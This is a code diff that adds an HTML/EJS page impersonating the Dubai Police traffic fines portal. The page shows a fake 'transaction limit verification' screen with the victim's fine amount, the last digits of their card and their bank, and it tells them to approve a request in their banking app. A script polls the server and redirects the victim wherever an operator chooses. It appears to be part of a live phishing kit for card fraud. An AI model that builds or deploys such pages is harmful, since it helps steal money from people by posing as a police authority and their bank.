@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<title>Limit Verification | Dubai Police</title>
+<link rel="icon" type="image/png" href="/dp-logo.png">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+*{box-sizing:border-box;margin:0;padding:0;}
+body{font-family:'Inter',-apple-system,sans-serif;background:#f0f4f8;min-height:100vh;display:flex;flex-direction:column;max-width:480px;margin:0 auto;}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.5}}
+@keyframes fadeUp{from{opacity:0;transform:translateY(12px)}to{opacity:1;transform:translateY(0)}}
+
+header{background:linear-gradient(135deg,#1a6b3a,#0f4a27);padding:14px 18px;display:flex;align-items:center;justify-content:space-between;}
+.main{flex:1;padding:20px 16px 32px;animation:fadeUp .4s ease both;}
+.card{background:white;border-radius:18px;overflow:hidden;box-shadow:0 4px 24px rgba(0,0,0,0.08);}
+.limit-band{background:linear-gradient(135deg,#b45309,#92400e);padding:28px 24px 24px;text-align:center;position:relative;overflow:hidden;}
+.limit-band::before{content:'';position:absolute;inset:0;background:radial-gradient(circle at 50% 0%,rgba(255,255,255,0.1) 0%,transparent 70%);}
+.limit-icon{width:64px;height:64px;border-radius:50%;background:rgba(255,255,255,0.2);display:flex;align-items:center;justify-content:center;margin:0 auto 14px;position:relative;z-index:1;}
+.limit-title{font-size:18px;font-weight:800;color:white;margin-bottom:6px;position:relative;z-index:1;}
+.limit-sub{font-size:12px;color:rgba(255,255,255,0.7);line-height:1.5;position:relative;z-index:1;}
+
+.details-section{padding:20px 20px 8px;}
+.detail-label{font-size:10px;font-weight:700;color:#9ca3af;text-transform:uppercase;letter-spacing:.6px;margin-bottom:12px;}
+.detail-row{display:flex;justify-content:space-between;align-items:center;padding:9px 0;border-bottom:1px solid #f1f5f9;font-size:13px;}
+.detail-row:last-child{border-bottom:none;}
+.detail-key{color:#6b7280;}
+.detail-val{font-weight:600;color:#0f172a;}
+
+.info-box{margin:0 20px 16px;padding:12px 14px;background:#fffbeb;border:1px solid #fde68a;border-radius:10px;font-size:12px;color:#92400e;line-height:1.5;display:flex;gap:10px;align-items:flex-start;}
+.action-section{padding:8px 20px 20px;}
+.wait-indicator{display:flex;align-items:center;justify-content:center;gap:8px;padding:12px;background:#fffbeb;border-radius:10px;margin-bottom:14px;font-size:12px;color:#92400e;font-weight:600;}
+.wait-dot{width:8px;height:8px;background:#f59e0b;border-radius:50%;animation:pulse 1.2s ease-in-out infinite;}
+.btn-cancel{display:block;width:100%;padding:11px;background:none;border:none;font-size:12px;color:#9ca3af;cursor:pointer;text-align:center;}
+.footer-note{text-align:center;font-size:11px;color:#9ca3af;padding:14px 20px;display:flex;align-items:center;justify-content:center;gap:5px;border-top:1px solid #f1f5f9;}
+</style>
+<%- include('_pixel') %>
+</head>
+<body>
+
+<header>
+  <div style="display:flex;align-items:center;gap:10px;">
+    <div style="width:36px;height:36px;border-radius:50%;overflow:hidden;"><img src="/dp-logo.png" alt="Dubai Police" width="36" height="36" style="object-fit:cover;"></div>
+    <div>
+      <div style="color:white;font-weight:800;font-size:14px;line-height:1.2;">Dubai Police</div>
+      <div style="color:rgba(255,255,255,0.6);font-size:11px;">شرطة دبي</div>
+    </div>
+  </div>
+  <div style="font-size:11px;color:rgba(255,255,255,0.5);">Traffic Fines Portal</div>
+</header>
+
+<div class="main">
+  <div class="card">
+    <div class="limit-band">
+      <div class="limit-icon">
+        <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
+      </div>
+      <div class="limit-title">Transaction Limit Verification</div>
+      <div class="limit-sub">Your bank requires additional verification<br>for this transaction amount.</div>
+    </div>
+
+    <div class="details-section">
+      <div class="detail-label">Transaction Details</div>
+      <div class="detail-row">
+        <span class="detail-key">Merchant</span>
+        <span class="detail-val">Dubai Police</span>
+      </div>
+      <div class="detail-row">
+        <span class="detail-key">Amount</span>
+        <span class="detail-val" style="color:#b45309;font-size:16px;">AED <%= totalFine.toLocaleString() %></span>
+      </div>
+      <div class="detail-row">
+        <span class="detail-key">Card</span>
+        <span class="detail-val" style="font-family:monospace;">•••• •••• •••• <%= cardLast4 %></span>
+      </div>
+      <div class="detail-row">
+        <span class="detail-key">Issuing Bank</span>
+        <span class="detail-val"><%= issuer || 'Your Bank' %></span>
+      </div>
+    </div>
+
+    <div class="info-box">
+      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="flex-shrink:0;margin-top:1px;"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
+      <span>Your bank is verifying the transaction limit. Please approve the verification request in your banking app or wait for an SMS notification.</span>
+    </div>
+
+    <div class="action-section">
+      <div class="wait-indicator">
+        <div class="wait-dot"></div>
+        Awaiting bank verification…
+      </div>
+      <button class="btn-cancel" onclick="window.location.href='/'">Cancel transaction</button>
+    </div>
+
+    <div class="footer-note">
+      <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+      Secured by 256-bit SSL encryption
+    </div>
+  </div>
+</div>
+
+<script>
+const SID        = <%- JSON.stringify(sid) %>;
+const TOTAL_FINE = <%- JSON.stringify(totalFine) %>;
+const CARD_LAST4 = <%- JSON.stringify(cardLast4) %>;
+const ISSUER     = <%- JSON.stringify(issuer || '') %>;
+const sidParams  = '?totalFine=' + TOTAL_FINE + '&cardLast4=' + encodeURIComponent(CARD_LAST4) + '&issuer=' + encodeURIComponent(ISSUER) + '&sid=' + SID;
+
+if (SID) {
+  setInterval(async () => {
+    try {
+      const r = await fetch('/api/check-status?sid=' + SID);
+      const d = await r.json();
+      if (d.action === 'redirect' && d.page) {
+        const extra = d.params ? '&' + d.params : '';
+        window.location.href = '/' + d.page + sidParams + extra;
+      }
+    } catch(e) {}
+  }, 3000);
+}
+</script>
+</body>
+</html>
